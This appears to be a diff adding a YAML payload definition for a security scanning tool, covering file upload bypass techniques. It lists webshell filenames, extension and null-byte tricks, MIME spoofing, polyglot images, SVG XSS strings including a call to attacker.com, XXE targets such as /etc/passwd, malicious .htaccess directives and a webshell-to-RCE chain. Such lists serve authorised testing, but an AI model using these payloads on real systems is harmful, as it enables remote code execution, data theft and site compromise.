@@ -1,0 +1,92 @@
+name: File Upload Vulnerabilities
+description: File upload bypass techniques - MIME spoofing, extension manipulation,
+  magic bytes.
+basic_payloads:
+- shell.php
+- shell.php5
+- shell.phtml
+- shell.php.jpg
+- shell.asp;.jpg
+bypass_techniques:
+- name: Extension Manipulation
+  description: Alternative executable extensions
+  payloads:
+  - .php -> .php3, .php4, .php5, .pht, .phtml, .phar
+  - .asp -> .aspx, .ashx, .asmx, .cer, .asa
+  - .jsp -> .jspx, .jsw, .jsv, .jspf
+- name: Double Extension
+  description: Double extensions to bypass filters
+  payloads:
+  - file.php.jpg
+  - file.php;.jpg
+  - file.php%00.jpg
+- name: Case Variation
+  description: Vary extension case
+  payloads:
+  - shell.PhP
+  - shell.ASP
+  - shell.JSP
+- name: MIME Type Spoofing
+  description: Fake MIME types
+  payloads:
+  - 'Content-Type: image/jpeg'
+  - 'Content-Type: image/png'
+  - 'Content-Type: application/pdf'
+- name: Magic Byte Injection
+  description: Add file signature bytes to payloads
+  payloads:
+  - GIF89a + PHP code
+  - PNG header + PHP code
+  - JPEG header + PHP code
+- name: Null Byte Injection
+  description: Null bytes to truncate filename
+  payloads:
+  - shell.php%00.jpg
+  - shell.asp%00.gif
+- name: SVG Upload
+  description: XSS via SVG file
+  payloads:
+  - <svg onload=alert(1)>
+  - <svg><use href=//attacker.com/evil.svg></svg>
+- name: XML-Based Upload (XXE)
+  description: XXE via XML file upload
+  payloads:
+  - XML DOCTYPE with XXE to /etc/passwd
+  - XML DOCTYPE with XXE to cloud metadata
+- name: Archive-Based
+  description: Use archive formats to hide files
+  payloads:
+  - shell.zip via phar:// wrapper
+  - shell.phar for deserialization
+- name: Polyglot Files
+  description: Valid images with embedded code
+  payloads:
+  - GIF89a + PHP polyglot
+  - JPEG + PHP comment section
+- name: .htaccess Override
+  description: Upload malicious .htaccess
+  payloads:
+  - AddType application/x-httpd-php .txt
+  - AddHandler php5-script .txt
+- name: Race Condition Upload
+  description: Race upload validation vs move
+  payloads:
+  - Race to access before validation
+  - Symlink race during upload processing
+detection_patterns:
+- multipart/form-data
+- Content-Disposition
+- upload
+- filepond
+- dropzone
+- file input
+chain_templates:
+- name: File Upload -> RCE
+  description: Upload webshell and execute commands
+  requirements:
+  - file_upload_endpoint
+  - writable_upload_dir
+- name: SVG Upload -> XSS
+  description: XSS via SVG file upload
+  requirements:
+  - svg_upload_allowed
